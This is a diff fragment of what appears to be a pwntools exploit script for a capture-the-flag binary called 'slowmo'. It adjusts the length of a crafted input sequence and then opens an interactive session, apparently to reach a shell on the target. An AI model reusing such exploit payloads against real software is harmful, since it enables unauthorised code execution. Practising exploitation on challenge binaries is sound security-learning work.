@@ -5,10 +5,7 @@ if args.REMOTE:
 else:
     p = process('./slowmo')
 p.send('<'*128)
-p.send('^'*(0xcc-0xb4))
+p.send('^'*(0xd0-0xb4))
 p.send('!')
 
 p.interactive()
-    
-
-
